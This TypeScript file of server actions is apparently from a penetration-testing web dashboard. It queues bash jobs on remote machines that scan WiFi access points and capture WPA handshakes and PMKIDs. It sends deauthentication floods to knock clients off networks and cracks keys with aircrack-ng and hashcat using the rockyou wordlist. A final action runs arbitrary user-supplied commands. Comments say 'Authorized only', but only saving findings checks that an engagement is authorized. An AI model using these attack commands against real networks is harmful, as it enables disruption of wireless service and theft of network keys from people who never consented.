"use server";

import { revalidatePath } from "next/cache";
import { redirect } from "next/navigation";
import { auth } from "@/auth";
import { prisma } from "@/lib/db";
import { wifiSecurityAdvice, type WifiApInput } from "@/lib/wifi-advice";
import { classifyFinding } from "@/lib/finding-map";

async function requireUser() {
  const session = await auth();
  if (!session?.user?.email) redirect("/login");
  return session.user.email;
}

const BACK = "/dashboard/wifi";

// Robust scan: detect the mode ON the runner at run time (the portal's reported
// interface state can lag). Try nmcli (managed) AND, if any interface is in
// monitor mode, airodump-ng it to a CSV. The parser handles either output.
const WIFI_SMART_SCAN =
  `bash -lc 'echo "== nmcli =="; nmcli -t -f SSID,BSSID,CHAN,SIGNAL,SECURITY dev wifi list 2>/dev/null; ` +
  `for d in /sys/class/net/*; do n=$(basename "$d"); ` +
  `if iw dev "$n" info 2>/dev/null | grep -q "type monitor"; then ` +
  `echo "== airodump $n =="; rm -f /tmp/rdwifi-*.csv; ` +
  `timeout 20 airodump-ng -w /tmp/rdwifi --output-format csv "$n" >/dev/null 2>&1; ` +
  `cat /tmp/rdwifi-01.csv 2>/dev/null; break; fi; done; echo "== iw dev =="; iw dev 2>/dev/null'`;

/** Queue a WiFi access-point scan on a runner; results render back on this page. */
export async function scanWifi(formData: FormData) {
  const email = await requireUser();
  const runnerId = String(formData.get("runnerId") ?? "");
  if (!runnerId) redirect(`${BACK}?error=${encodeURIComponent("Pick a machine to scan from.")}`);

  await prisma.job.create({
    data: {
      runnerId,
      tool: "custom",
      target: "wifi-scan",
      args: WIFI_SMART_SCAN,
      queuedBy: email,
    },
  });
  revalidatePath(BACK);
  redirect(`${BACK}?scanned=1`);
}

/**
 * Inspect one access point: a targeted airodump capture on its channel + BSSID
 * (~30s) that lists the devices connected to it, their signal/packets/probes,
 * and (via the parser) a rough distance. Requires a monitor-mode interface.
 */
export async function inspectNetwork(formData: FormData) {
  const email = await requireUser();
  const runnerId = String(formData.get("runnerId") ?? "");
  const bssid = String(formData.get("bssid") ?? "").trim().toUpperCase();
  const channel = String(formData.get("channel") ?? "").trim();
  if (!runnerId) redirect(`${BACK}?error=${encodeURIComponent("Pick a machine.")}`);
  if (!/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(bssid)) {
    redirect(`${BACK}?error=${encodeURIComponent("Invalid BSSID.")}`);
  }
  // airodump accepts a channel number; default to all channels if unknown.
  const chArg = /^\d{1,3}$/.test(channel) ? `-c ${channel} ` : "";

  const cmd =
    `bash -lc 'M=$(for d in /sys/class/net/*; do n=$(basename "$d"); ` +
    `iw dev "$n" info 2>/dev/null | grep -q "type monitor" && echo "$n" && break; done); ` +
    `if [ -z "$M" ]; then echo NO_MONITOR; exit 0; fi; rm -f /tmp/rdtgt-*.csv; ` +
    `timeout 30 airodump-ng ${chArg}--bssid ${bssid} -w /tmp/rdtgt --output-format csv "$M" >/dev/null 2>&1; ` +
    `cat /tmp/rdtgt-01.csv 2>/dev/null'`;

  await prisma.job.create({
    data: {
      runnerId,
      tool: "custom",
      target: `wifi-inspect:${bssid}`,
      args: cmd,
      queuedBy: email,
    },
  });
  revalidatePath(BACK);
  redirect(`${BACK}?inspected=1`);
}

function findMonSh() {
  // Shell snippet that sets $M to the first monitor-mode interface.
  return `M=$(for d in /sys/class/net/*; do n=$(basename "$d"); iw dev "$n" info 2>/dev/null | grep -q "type monitor" && echo "$n" && break; done); if [ -z "$M" ]; then echo NO_MONITOR; exit 0; fi`;
}

/**
 * Capture a WPA handshake for one AP (~120s targeted airodump), then report
 * whether a handshake landed (via aircrack-ng). Authorized networks only.
 */
export async function captureHandshake(formData: FormData) {
  const email = await requireUser();
  const runnerId = String(formData.get("runnerId") ?? "");
  const bssid = String(formData.get("bssid") ?? "").trim().toUpperCase();
  const channel = String(formData.get("channel") ?? "").trim();
  if (!runnerId || !/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(bssid)) {
    redirect(`${BACK}?error=${encodeURIComponent("Pick a machine and a valid AP.")}`);
  }
  const chArg = /^\d{1,3}$/.test(channel) ? `-c ${channel} ` : "";
  const cmd =
    `bash -lc '${findMonSh()}; rm -f /tmp/rdhs-*; ` +
    `timeout 120 airodump-ng ${chArg}--bssid ${bssid} -w /tmp/rdhs "$M" >/dev/null 2>&1; ` +
    `echo "== handshake check =="; aircrack-ng /tmp/rdhs-01.cap 2>/dev/null'`;
  await prisma.job.create({
    data: { runnerId, tool: "custom", target: `wifi-capture:${bssid}`, args: cmd, queuedBy: email },
  });
  redirect("/dashboard/jobs?queued=1");
}

/**
 * Deauthenticate a device (or broadcast) on an AP to force it to reconnect — the
 * fastest way to capture a handshake. Authorized networks only.
 */
export async function deauthClient(formData: FormData) {
  const email = await requireUser();
  const runnerId = String(formData.get("runnerId") ?? "");
  const bssid = String(formData.get("bssid") ?? "").trim().toUpperCase();
  const client = String(formData.get("client") ?? "").trim().toUpperCase();
  if (!runnerId || !/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(bssid)) {
    redirect(`${BACK}?error=${encodeURIComponent("Pick a machine and a valid AP.")}`);
  }
  const cArg = /^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(client) ? `-c ${client} ` : "";
  const cmd =
    `bash -lc '${findMonSh()}; aireplay-ng --deauth 5 -a ${bssid} ${cArg}"$M"'`;
  await prisma.job.create({
    data: { runnerId, tool: "custom", target: `wifi-deauth:${bssid}`, args: cmd, queuedBy: email },
  });
  redirect("/dashboard/jobs?queued=1");
}

/** Auto handshake: fire a few deauths to force a reconnect WHILE airodump
 * captures, then check for a handshake — the fastest grab. Authorized only. */
export async function autoHandshake(formData: FormData) {
  const email = await requireUser();
  const runnerId = String(formData.get("runnerId") ?? "");
  const bssid = String(formData.get("bssid") ?? "").trim().toUpperCase();
  const channel = String(formData.get("channel") ?? "").trim();
  if (!runnerId || !/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(bssid)) {
    redirect(`${BACK}?error=${encodeURIComponent("Pick a machine and a valid AP.")}`);
  }
  const chArg = /^\d{1,3}$/.test(channel) ? `-c ${channel} ` : "";
  const cmd =
    `bash -lc '${findMonSh()}; rm -f /tmp/rdhs-*; ` +
    `( sleep 8; for i in 1 2 3; do aireplay-ng --deauth 5 -a ${bssid} "$M" >/dev/null 2>&1; sleep 6; done ) & ` +
    `timeout 90 airodump-ng ${chArg}--bssid ${bssid} -w /tmp/rdhs "$M" >/dev/null 2>&1; ` +
    `echo "== handshake check =="; aircrack-ng /tmp/rdhs-01.cap 2>/dev/null'`;
  await prisma.job.create({
    data: { runnerId, tool: "custom", target: `wifi-capture:${bssid}`, args: cmd, queuedBy: email },
  });
  redirect("/dashboard/jobs?queued=1");
}

/**
 * Crack a captured handshake (/tmp/rdhs-01.cap) with a wordlist. Defaults to
 * rockyou (auto-gunzip), or a custom wordlist path. Dictionary attack only —
 * brute-forcing the full WPA keyspace is infeasible. Authorized only.
 */
export async function crackHandshake(formData: FormData) {
  const email = await requireUser();
  const runnerId = String(formData.get("runnerId") ?? "");
  const bssid = String(formData.get("bssid") ?? "").trim().toUpperCase();
  const wordlist = String(formData.get("wordlist") ?? "").trim();
  if (!runnerId || !/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(bssid)) {
    redirect(`${BACK}?error=${encodeURIComponent("Pick a machine and a valid AP.")}`);
  }
  // Allow only safe path characters if a custom wordlist is given.
  if (wordlist && !/^[A-Za-z0-9._/\-]+$/.test(wordlist)) {
    redirect(`${BACK}?error=${encodeURIComponent("Invalid wordlist path.")}`);
  }

  const cmd = wordlist
    ? `bash -lc 'W="${wordlist}"; [ -f "$W" ] || { echo "Wordlist not found: $W"; exit 0; }; ` +
      `echo "Cracking with $W…"; aircrack-ng -w "$W" -b ${bssid} /tmp/rdhs-01.cap'`
    : `bash -lc 'W=/usr/share/wordlists/rockyou.txt; ` +
      `[ -f "$W" ] || { [ -f "$W.gz" ] && gunzip -kf "$W.gz"; }; ` +
      `[ -f "$W" ] || W=$(ls /usr/share/wordlists/*.txt 2>/dev/null | head -1); ` +
      `if [ -z "$W" ]; then echo "NO_WORDLIST — install seclists/wordlists or pass a path"; exit 0; fi; ` +
      `echo "Cracking with $W…"; aircrack-ng -w "$W" -b ${bssid} /tmp/rdhs-01.cap'`;

  await prisma.job.create({
    data: { runnerId, tool: "custom", target: `wifi-crack:${bssid}`, args: cmd, queuedBy: email },
  });
  redirect("/dashboard/jobs?queued=1");
}

/**
 * GPU/CPU crack via hashcat (mode 22000). Converts the capture to .22000 with
 * hcxpcapngtool, then runs hashcat against a wordlist (rockyou default). Far
 * faster than aircrack-ng on a GPU. Authorized only.
 */
export async function crackHashcat(formData: FormData) {
  const email = await requireUser();
  const runnerId = String(formData.get("runnerId") ?? "");
  const bssid = String(formData.get("bssid") ?? "").trim().toUpperCase();
  if (!runnerId || !/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(bssid)) {
    redirect(`${BACK}?error=${encodeURIComponent("Pick a machine and a valid AP.")}`);
  }
  const cmd =
    `bash -lc 'command -v hcxpcapngtool >/dev/null || { echo "Install hcxtools first"; exit 0; }; ` +
    `command -v hashcat >/dev/null || { echo "Install hashcat first"; exit 0; }; ` +
    `hcxpcapngtool -o /tmp/rdhs.22000 /tmp/rdhs-01.cap >/dev/null 2>&1; ` +
    `[ -s /tmp/rdhs.22000 ] || { echo "No PMKID/handshake in capture — capture first"; exit 0; }; ` +
    `W=/usr/share/wordlists/rockyou.txt; [ -f "$W" ] || { [ -f "$W.gz" ] && gunzip -kf "$W.gz"; }; ` +
    `echo "Cracking with hashcat (m22000)…"; hashcat -m 22000 /tmp/rdhs.22000 "$W" --quiet; ` +
    `echo "== result =="; hashcat -m 22000 /tmp/rdhs.22000 --show'`;
  await prisma.job.create({
    data: { runnerId, tool: "custom", target: `wifi-crack:${bssid}`, args: cmd, queuedBy: email },
  });
  redirect("/dashboard/jobs?queued=1");
}

/**
 * Clientless PMKID capture (hcxdumptool) — grabs a crackable hash from the AP
 * itself without needing a connected client, then converts to hashcat 22000.
 * Authorized only.
 */
export async function capturePmkid(formData: FormData) {
  const email = await requireUser();
  const runnerId = String(formData.get("runnerId") ?? "");
  const bssid = String(formData.get("bssid") ?? "").trim().toUpperCase();
  if (!runnerId || !/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/.test(bssid)) {
    redirect(`${BACK}?error=${encodeURIComponent("Pick a machine and a valid AP.")}`);
  }
  const cmd =
    `bash -lc '${findMonSh()}; command -v hcxdumptool >/dev/null || { echo "Install hcxdumptool first"; exit 0; }; ` +
    `rm -f /tmp/rdpmkid.pcapng; ` +
    `timeout 60 hcxdumptool -i "$M" -w /tmp/rdpmkid.pcapng --rds=1 >/dev/null 2>&1; ` +
    `command -v hcxpcapngtool >/dev/null && hcxpcapngtool -o /tmp/rdhs.22000 /tmp/rdpmkid.pcapng 2>/dev/null; ` +
    `if [ -s /tmp/rdhs.22000 ]; then echo "PMKID/hash captured → /tmp/rdhs.22000. Crack it with the hashcat button."; else echo "No PMKID captured (AP may not be vulnerable; try a handshake instead)."; fi'`;
  await prisma.job.create({
    data: { runnerId, tool: "custom", target: `wifi-pmkid:${bssid}`, args: cmd, queuedBy: email },
  });
  redirect("/dashboard/jobs?queued=1");
}

/**
 * Save a WiFi security review as findings on an authorized engagement — turns the
 * assessment into report-ready items (recomputed server-side; one finding per
 * real issue).
 */
export async function saveWifiFindings(formData: FormData) {
  await requireUser();
  const engagementId = String(formData.get("engagementId") ?? "");
  if (!engagementId) redirect(`${BACK}?error=${encodeURIComponent("Pick an engagement to save into.")}`);
  const eng = await prisma.engagement.findUnique({ where: { id: engagementId }, select: { authorized: true } });
  if (!eng) redirect(`${BACK}?error=${encodeURIComponent("Engagement not found.")}`);
  if (!eng!.authorized) redirect(`${BACK}?error=${encodeURIComponent("Authorize the engagement first.")}`);

  const ap: WifiApInput = {
    ssid: String(formData.get("ssid") ?? "").slice(0, 64),
    security: String(formData.get("security") ?? ""),
    cipher: String(formData.get("cipher") ?? ""),
    auth: String(formData.get("auth") ?? ""),
    clients: Number(formData.get("clients") ?? 0) || 0,
    crackedKey: String(formData.get("crackedKey") ?? "").slice(0, 128),
  };
  const bssid = String(formData.get("bssid") ?? "").slice(0, 32);
  const where = `${ap.ssid || "(hidden)"}${bssid ? ` (${bssid})` : ""}`;

  const { issues } = wifiSecurityAdvice(ap);
  const real = issues.filter((i) => i.severity !== "info");
  if (real.length === 0) {
    redirect(`${BACK}?error=${encodeURIComponent("No issues to save — this AP looks well configured.")}`);
  }
  const data = real.map((i) => {
    const title = `WiFi: ${i.title} — ${where}`;
    const description = i.detail;
    return {
      engagementId,
      title,
      severity: i.severity,
      description,
      recommendation: i.fix,
      ...classifyFinding({ title, description, severity: i.severity, tool: "wifi" }),
    };
  });
  await prisma.finding.createMany({ data });
  await prisma.engagement.update({ where: { id: engagementId }, data: { updatedAt: new Date() } });
  redirect(`${BACK}?ok=${encodeURIComponent(`Saved ${data.length} WiFi finding(s) to the engagement`)}`);
}

/** Run a wireless command (monitor mode, capture, etc.) on a runner directly. */
export async function runWifiCommand(formData: FormData) {
  const email = await requireUser();
  const runnerId = String(formData.get("runnerId") ?? "");
  const command = String(formData.get("command") ?? "").trim();
  if (!runnerId || !command) {
    redirect(`${BACK}?error=${encodeURIComponent("Pick a machine and a command.")}`);
  }
  if (command.length > 1024 || !/^[\x20-\x7e]+$/.test(command)) {
    redirect(`${BACK}?error=${encodeURIComponent("Invalid command.")}`);
  }
  await prisma.job.create({
    data: {
      runnerId,
      tool: "custom",
      target: command.split(/\s+/)[0].slice(0, 40),
      args: command,
      queuedBy: email,
    },
  });
  revalidatePath(BACK);
  redirect("/dashboard/jobs?queued=1");
}
